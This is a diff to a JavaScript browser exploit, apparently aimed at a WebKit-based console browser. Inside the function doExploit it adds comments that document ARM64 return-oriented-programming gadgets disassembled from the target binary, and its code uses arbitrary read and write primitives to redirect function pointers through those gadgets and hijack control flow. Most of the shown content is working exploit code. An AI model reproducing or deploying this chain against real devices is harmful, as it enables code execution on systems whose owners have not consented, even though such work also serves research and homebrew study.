@@ -243,7 +243,25 @@ function doExploit(buf, stale, temp) {
 	function setjmp() {
 		var mainaddr = walkList();
 		log('Main module at ' + paddr(mainaddr));
-		var test = 0x39FEEC;
+
+		/*
+			First gadget: hijack X8 via ADRP and known PC, load X2 from known address and branch there
+		
+			.text:000000000039FEEC 08 2C 00 90                 ADRP            X8, #qword_91F320@PAGE ; Address of Page
+			.text:000000000039FEF0 08 81 0C 91                 ADD             X8, X8, #qword_91F320@PAGEOFF ; Rd = Op1 + Op2
+			.text:000000000039FEF4 02 05 40 F9                 LDR             X2, [X8,#(qword_91F328 - 0x91F320)] ; Load from Memory
+			.text:000000000039FEF8 40 00 1F D6                 BR              X2      ; Branch To Register
+		*/
+		/*
+			Second gadget: assuming known X8, leak SP via X24 and branch to 
+		
+			.text:00000000003E2724                 LDR             X9, [X8,#0x30]
+			.text:00000000003E2728                 MOV             X8, SP
+			.text:00000000003E272C                 MOV             X0, X23
+			.text:00000000003E2730                 MOV             X24, SP
+			.text:00000000003E2734                 BLR             X9
+		*/
+		var test = 0x39FEEC; // First gadget addr
 		var jaddr = add2(mainaddr, test);
 		log('New jump at ' + paddr(jaddr));
 		log('Assigning function pointer');
@@ -251,11 +269,12 @@ function doExploit(buf, stale, temp) {
 		log('Function object at ' + paddr(funcaddr));
 		var curptr = read8(funcaddr, 8);
 
-		var retaddr = add2(mainaddr, 0x3E2724);
+		
+		var retaddr = add2(mainaddr, 0x3E2724); // Second gadget addr
 		var memaddr = add2(mainaddr, 0x91F328);
 		write8(retaddr, memaddr);
 		retaddr = add2(add2(curptr, -funcbase), 0x836050);
-		memaddr = add2(mainaddr, 0x91F350);
+		memaddr = add2(mainaddr, 0x91F350); // Last gadget addr (should just be `blr X27`)
 		write8(retaddr, memaddr);
 
 		// For addresses in webkit_wkc
